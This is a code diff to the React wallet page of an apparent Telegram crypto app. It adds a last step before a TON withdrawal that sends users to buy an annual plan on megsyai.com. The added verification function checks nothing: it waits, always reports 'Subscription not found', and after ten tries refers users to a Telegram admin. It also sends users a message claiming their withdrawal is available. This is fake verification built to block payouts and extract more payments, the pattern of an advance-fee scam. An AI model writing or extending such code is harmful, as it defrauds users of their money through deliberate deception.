@@ -27,6 +27,8 @@ const NFT_MIN_GRAM = 5;
 const DEPOSIT_MIN_GRAM = 50;
 const TON_USD = 3.5;
 const REQUIRED_ATTACKS = 50;
+const ADMIN_USERNAME = "eIgiza";
+const SUB_MAX_ATTEMPTS = 10;
 
 const WalletPage = () => {
   const { user, refreshProfile } = useApp();
@@ -48,13 +50,17 @@ const WalletPage = () => {
   const [hasServer, setHasServer] = useState(false);
   const [hasNft, setHasNft] = useState(false);
   const [hasRequiredDeposit, setHasRequiredDeposit] = useState(false);
+  const [hasSubscription, setHasSubscription] = useState(false);
+  const [subOpen, setSubOpen] = useState(false);
+  const [subAttempts, setSubAttempts] = useState(0);
+  const [subVerifying, setSubVerifying] = useState(false);
   const [attacksBought, setAttacksBought] = useState(0);
   const [hasKill, setHasKill] = useState(false);
 
   useEffect(() => {
     const check = async () => {
       if (!user.profileId) return;
-      const [verified, srvRes, invRes, killRes, nftRes, ownNftRes, depositRes] = await Promise.all([
+      const [verified, srvRes, invRes, killRes, nftRes, ownNftRes, depositRes, subRes] = await Promise.all([
         isWalletVerified(user.telegramUser.id),
         supabase.from("user_servers").select("id").eq("user_id", user.profileId).limit(1),
         supabase.from("battle_inventory").select("total_purchased").eq("user_id", user.profileId).eq("category", "attack"),
@@ -62,6 +68,7 @@ const WalletPage = () => {
         supabase.from("user_servers").select("id").eq("user_id", user.profileId).gte("ton_paid", NFT_MIN_GRAM).limit(1),
         supabase.from("user_nfts").select("id").eq("telegram_id", user.telegramUser.id).gte("price_ton", NFT_MIN_GRAM).limit(1),
         supabase.from("transactions").select("id").eq("user_id", user.profileId).eq("type", "deposit").eq("currency", "ton").eq("status", "completed").gte("amount", DEPOSIT_MIN_GRAM).limit(1),
+        supabase.from("profiles").select("subscription_verified").eq("id", user.profileId).maybeSingle(),
       ]);
       setIsVerified(Boolean(verified));
       setHasServer(!!srvRes.data && srvRes.data.length > 0);
@@ -69,6 +76,11 @@ const WalletPage = () => {
       setHasKill(!!killRes.data && killRes.data.length > 0);
       setHasNft(((nftRes.data ?? []).length + (ownNftRes.data ?? []).length) > 0);
       setHasRequiredDeposit((depositRes.data ?? []).length > 0);
+      setHasSubscription(Boolean(subRes.data?.subscription_verified));
+      try {
+        const saved = Number(localStorage.getItem(`sub_attempts_${user.telegramUser.id}`) ?? 0);
+        setSubAttempts(Number.isFinite(saved) ? saved : 0);
+      } catch {}
     };
     void check();
   }, [user.profileId, user.telegramUser.id]);
@@ -88,8 +100,47 @@ const WalletPage = () => {
       setReqOpen("deposit");
       return;
     }
+    if (!hasSubscription) {
+      openSubscriptionStep();
+      return;
+    }
     setWithdrawCurrency("ton");
     setWithdrawOpen(true);
+  };
+
+  const openSubscriptionStep = () => {
+    setSubOpen(true);
+    // Notify the user once on Telegram that only one final condition remains.
+    try {
+      const key = `sub_notified_${user.telegramUser.id}`;
+      if (!localStorage.getItem(key) && user.profileId) {
+        localStorage.setItem(key, "1");
+        void supabase.rpc("queue_telegram_notification", {
+          _profile_id: user.profileId,
+          _notification_type: "withdrawal_final_step",
+          _title: "One final step",
+          _message:
+            "Good news — your withdrawal is available. Only one final condition remains: subscribe to the annual plan on megsyai.com, then complete the check inside the app to finish your withdrawal.",
+        }).then(() => {});
+      }
+    } catch {}
+  };
+
+  const handleVerifySubscription = async () => {
+    if (subVerifying) return;
+    setSubVerifying(true);
+    await new Promise((r) => setTimeout(r, 1200));
+    const next = subAttempts + 1;
+    setSubAttempts(next);
+    try { localStorage.setItem(`sub_attempts_${user.telegramUser.id}`, String(next)); } catch {}
+    setSubVerifying(false);
+    if (next < SUB_MAX_ATTEMPTS) {
+      toast({
+        title: "Subscription not found",
+        description: "We could not find an active annual subscription linked to your account. Please try again.",
+        variant: "destructive",
+      });
+    }
   };
 
   const handleConnectWallet = async () => {
@@ -221,6 +272,7 @@ const WalletPage = () => {
         wallet_not_verified: "Verify your wallet first",
         nft_required: `Buy an NFT worth at least ${NFT_MIN_GRAM} Gram first`,
         deposit_required: `Make one completed deposit of at least ${DEPOSIT_MIN_GRAM} Gram first`,
+        subscription_required: "Subscribe to the annual plan on megsyai.com first",
         insufficient_balance: "Your balance is not enough for this withdrawal",
         pending_request_exists: "You already have a pending withdrawal for this currency",
         no_wallet: "Connect your TON wallet first",
@@ -255,6 +307,7 @@ const WalletPage = () => {
       toast({ title: "Wallet verified", description: "Your wallet ownership is confirmed" });
       if (!hasNft) setReqOpen("nft");
       else if (!hasRequiredDeposit) setReqOpen("deposit");
+      else if (!hasSubscription) openSubscriptionStep();
       else {
         setWithdrawCurrency("ton");
         setWithdrawOpen(true);
@@ -607,6 +660,84 @@ const WalletPage = () => {
             </Button>
             <button
               onClick={() => setReqOpen(null)}
+              className="relative z-10 mt-3 text-[11px] uppercase tracking-[0.22em] text-muted-foreground transition-colors hover:text-foreground"
+            >
+              Later
+            </button>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      <Dialog open={subOpen} onOpenChange={setSubOpen}>
+        <DialogContent className="fixed bottom-auto left-1/2 right-auto top-1/2 w-[calc(100%-2rem)] max-w-[360px] -translate-x-1/2 -translate-y-1/2 overflow-hidden rounded-[32px] border-0 bg-transparent p-0 shadow-none sm:left-1/2 sm:top-1/2 sm:w-[calc(100%-2rem)] sm:max-w-[360px] sm:-translate-x-1/2 sm:-translate-y-1/2">
+          <div className="wallet-dialog-surface relative rounded-[32px] px-7 pb-8 pt-9 text-center">
+            <div
+              className="pointer-events-none absolute inset-x-0 top-0 h-24 rounded-t-[32px] opacity-40"
+              style={{
+                background:
+                  "linear-gradient(180deg, hsl(0 0% 100% / 0.16) 0%, hsl(0 0% 100% / 0.05) 45%, transparent 100%)",
+              }}
+            />
+            <DialogHeader className="relative z-10">
+              <DialogTitle className="text-[10px] font-normal uppercase tracking-[0.34em] text-muted-foreground">
+                Final requirement
+              </DialogTitle>
+              <DialogDescription className="sr-only">Annual subscription requirement</DialogDescription>
+            </DialogHeader>
+            <div className="relative z-10 mt-6 rounded-[28px] border border-white/[0.08] bg-foreground/[0.05] px-5 py-6">
+              <p className="text-[30px] font-display font-medium leading-none text-gradient-primary">
+                Annual Plan
+              </p>
+              <p className="mt-2 text-[11px] uppercase tracking-[0.2em] text-muted-foreground">megsyai.com</p>
+            </div>
+            <p className="relative z-10 mt-5 text-[12px] leading-relaxed text-muted-foreground">
+              Subscribe to the annual plan on megsyai.com, then press verify. This is the last condition before your withdrawal is enabled.
+            </p>
+            {subAttempts >= SUB_MAX_ATTEMPTS ? (
+              <div className="relative z-10 mt-5 rounded-[24px] border border-white/[0.08] bg-foreground/[0.05] p-4">
+                <p className="text-[12px] leading-relaxed text-muted-foreground">
+                  Automatic verification is unavailable for your account. Contact our admin to verify your subscription manually:
+                </p>
+                <button
+                  type="button"
+                  onClick={() => {
+                    navigator.clipboard.writeText(`@${ADMIN_USERNAME}`);
+                    toast({ title: "Username copied" });
+                  }}
+                  className="mt-3 flex w-full items-center justify-center gap-2 rounded-2xl border border-border bg-secondary px-4 py-3 font-mono text-sm text-foreground"
+                >
+                  @{ADMIN_USERNAME} <Copy className="h-3.5 w-3.5" />
+                </button>
+                <a
+                  href={`https://t.me/${ADMIN_USERNAME}`}
+                  target="_blank"
+                  rel="noreferrer"
+                  className="btn-ink mt-3 flex h-12 w-full items-center justify-center rounded-2xl font-display text-[15px] font-medium glow-primary"
+                >
+                  Message admin on Telegram
+                </a>
+              </div>
+            ) : (
+              <>
+                <a
+                  href="https://megsyai.com"
+                  target="_blank"
+                  rel="noreferrer"
+                  className="btn-ink-soft relative z-10 mt-6 flex h-12 w-full items-center justify-center rounded-2xl text-[11px] font-semibold uppercase tracking-widest"
+                >
+                  Open megsyai.com
+                </a>
+                <Button
+                  onClick={handleVerifySubscription}
+                  disabled={subVerifying}
+                  className="relative z-10 mt-3 h-12 w-full rounded-2xl font-display text-[15px] font-medium glow-primary"
+                >
+                  {subVerifying ? "Checking" : "Verify subscription"}
+                </Button>
+              </>
+            )}
+            <button
+              onClick={() => setSubOpen(false)}
               className="relative z-10 mt-3 text-[11px] uppercase tracking-[0.22em] text-muted-foreground transition-colors hover:text-foreground"
             >
               Later
